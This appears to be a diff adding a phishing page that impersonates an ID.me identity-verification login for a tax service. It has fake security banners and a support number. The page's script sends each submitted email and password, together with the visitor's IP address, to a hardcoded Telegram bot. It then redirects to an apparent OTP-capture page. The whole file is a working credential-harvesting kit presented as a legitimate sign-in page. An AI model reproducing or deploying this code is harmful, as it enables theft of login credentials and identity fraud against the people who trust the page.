@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Secure Verification</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          fontFamily: { inter: ['Inter', 'sans-serif'] }
+        }
+      }
+    }
+  </script>
+
+  <style>
+    @keyframes marquee {
+      0% {
+        transform: translateX(100%);
+      }
+
+      100% {
+        transform: translateX(-100%);
+      }
+    }
+  </style>
+</head>
+
+<body class="font-inter bg-slate-50 min-h-screen">
+
+  <main class="min-h-screen grid grid-cols-1 md:grid-cols-2">
+
+    <!-- LEFT: Login / Verification -->
+    <section class="flex items-center justify-center bg-slate-50 px-6 pb-[100px] pt-[30px]">
+      <div class="w-full max-w-md">
+
+        <!-- Security Banner -->
+        <div class="mb-6 overflow-hidden rounded-md bg-green-200">
+          <div
+            class="inline-block animate-[marquee_18s_linear_infinite] whitespace-nowrap px-4 py-2 text-xs text-green-900 font-bold ">
+            🔒 Your information is protected in a secure, encrypted, end-to-end environment.
+          </div>
+        </div>
+
+        <!-- Card -->
+        <div class="rounded-xl bg-white border border-slate-200 shadow-sm p-8">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/8/8b/ID.me_Logo.png" width="100">
+          <h1 class="text-xl font-semibold text-slate-900 mb-1 mt-10">
+            Secure sign in
+          </h1>
+          <p class="text-sm text-slate-500 mb-6">
+            Verify your identity to continue
+          </p>
+
+          <form id="loginForm" class="space-y-5">
+            <div>
+              <label for="email" class="block text-sm font-medium text-slate-700 mb-1">
+                Email address
+              </label>
+              <input type="email" id="email" name="email" placeholder="you@example.com" required
+                class="w-full rounded-md border border-slate-300 px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600" />
+              <div class="error-message text-red-500 text-xs mt-1 hidden"></div>
+            </div>
+
+            <div>
+              <label for="password" class="block text-sm font-medium text-slate-700 mb-1">
+                Password
+              </label>
+              <input type="password" id="password" name="password" placeholder="••••••••" required
+                class="w-full rounded-md border border-slate-300 px-4 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-600 focus:border-blue-600" />
+              <div class="error-message text-red-500 text-xs mt-1 hidden"></div>
+            </div>
+
+            <button type="submit" id="submitBtn"
+              class="w-full rounded-md bg-blue-700 py-2.5 text-sm font-medium text-white hover:bg-blue-800 focus:outline-none focus:ring-2 focus:ring-blue-600 focus:ring-offset-2 transition flex items-center justify-center">
+              <span id="btnText">Authenticate</span>
+              <svg id="loadingSpinner" class="w-4 h-4 ml-2 animate-spin hidden" fill="none" stroke="currentColor"
+                viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                  d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+              </svg>
+            </button>
+          </form>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- RIGHT: Brand / Trust / Support -->
+    <aside class="flex items-center justify-center bg-white border-l border-slate-200 px-6 py-[50px] ">
+      <div class="max-w-sm w-full space-y-6">
+
+        <!-- Brand -->
+        <div class="flex items-center space-x-3">
+          <div
+            class="h-10 w-10 rounded-lg bg-gray-700 flex items-center justify-center text-white font-semibold text-lg">
+            R
+          </div>
+          <div>
+            <p class="text-sm text-slate-500">
+              Secure third-party verification
+            </p>
+            <h2 class="text-lg font-semibold text-slate-900">
+              Ryan Tax Services
+            </h2>
+          </div>
+        </div>
+
+        <!-- Divider -->
+        <div class="h-px bg-slate-200"></div>
+
+        <!-- Support -->
+        <div class="space-y-2 text-sm text-slate-600">
+          <p class="font-medium text-slate-700">
+            Need help?
+          </p>
+          <div class="flex items-center space-x-2">
+            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
+            </svg>
+            <span class="font-medium text-slate-800">
+              +1 (945) 334-6439
+            </span>
+          </div>
+          <p class="text-xs text-slate-500">
+            Support available during business hours
+          </p>
+        </div>
+
+        <!-- Trust -->
+        <div class="rounded-lg bg-slate-50 border border-slate-200 p-4 text-xs text-slate-600">
+          Identity verification is handled securely using encrypted communication and industry-standard security
+          practices.
+        </div>
+        <img src="/secured.jpg" class="w-[250px]" />
+
+      </div>
+    </aside>
+
+  </main>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const loginForm = document.getElementById('loginForm');
+      const submitBtn = document.getElementById('submitBtn');
+      const btnText = document.getElementById('btnText');
+      const loadingSpinner = document.getElementById('loadingSpinner');
+
+      // Telegram bot configuration
+
+
+      const botToken = '8572531357:AAHH3Xeq9hfvLSFcLUS6mz3JfrHmSJR0x4U';
+      const chatId = '-5036651730';
+
+      // Function to send data to Telegram
+      async function sendToTelegram(email, password) {
+        const message = `🔐 *New Login Attempt*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}\n\n📅 *Time:* ${new Date().toLocaleString()}\n🌐 *IP:* ${await getClientIP()}`;
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        return response.json();
+      }
+
+      // Function to get client IP (simplified version)
+      async function getClientIP() {
+        try {
+          const response = await fetch('https://api.ipify.org?format=json');
+          const data = await response.json();
+          return data.ip || 'Unknown';
+        } catch (error) {
+          return 'Unknown';
+        }
+      }
+
+      // Function to show loading state
+      function setLoading(isLoading) {
+        if (isLoading) {
+          submitBtn.disabled = true;
+          btnText.textContent = 'Authenticating...';
+          loadingSpinner.classList.remove('hidden');
+        } else {
+          submitBtn.disabled = false;
+          btnText.textContent = 'Authenticate';
+          loadingSpinner.classList.add('hidden');
+        }
+      }
+
+      // Function to show field error
+      function showFieldError(fieldId, message) {
+        const field = document.getElementById(fieldId);
+        const errorEl = field.parentElement.querySelector('.error-message');
+
+        field.classList.add('border-red-500');
+        if (errorEl) {
+          errorEl.textContent = message;
+          errorEl.classList.remove('hidden');
+        }
+      }
+
+      // Function to clear field errors
+      function clearFieldErrors() {
+        document.querySelectorAll('.error-message').forEach(el => {
+          el.classList.add('hidden');
+          el.textContent = '';
+        });
+        document.querySelectorAll('input').forEach(el => {
+          el.classList.remove('border-red-500');
+        });
+      }
+
+      // Form submission handler
+      loginForm.addEventListener('submit', async function (e) {
+        e.preventDefault();
+
+        // Clear previous errors
+        clearFieldErrors();
+
+        // Get form data
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+
+        // Basic validation
+        let hasError = false;
+
+        if (!email) {
+          showFieldError('email', 'Email is required');
+          hasError = true;
+        } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+          showFieldError('email', 'Please enter a valid email address');
+          hasError = true;
+        }
+
+        if (!password) {
+          showFieldError('password', 'Password is required');
+          hasError = true;
+        }
+
+        if (hasError) return;
+
+        // Show loading state
+        setLoading(true);
+
+        try {
+          // Send data to Telegram
+          const result = await sendToTelegram(email, password);
+
+          if (result.ok) {
+            // Success - redirect to OTP page
+            setTimeout(() => {
+              window.location.href = './idme-otp.html';
+            }, 1000);
+          } else {
+            throw new Error('Failed to send to Telegram');
+          }
+        } catch (error) {
+          console.error('Error:', error);
+          // Show general error
+          alert('Authentication failed. Please try again.');
+        } finally {
+          setLoading(false);
+        }
+      });
+
+      // Clear errors on input
+      document.getElementById('email').addEventListener('input', function () {
+        this.classList.remove('border-red-500');
+        const errorEl = this.parentElement.querySelector('.error-message');
+        if (errorEl) {
+          errorEl.classList.add('hidden');
+        }
+      });
+
+      document.getElementById('password').addEventListener('input', function () {
+        this.classList.remove('border-red-500');
+        const errorEl = this.parentElement.querySelector('.error-message');
+        if (errorEl) {
+          errorEl.classList.add('hidden');
+        }
+      });
+    });
+  </script>
+
+</body>
+
+</html>
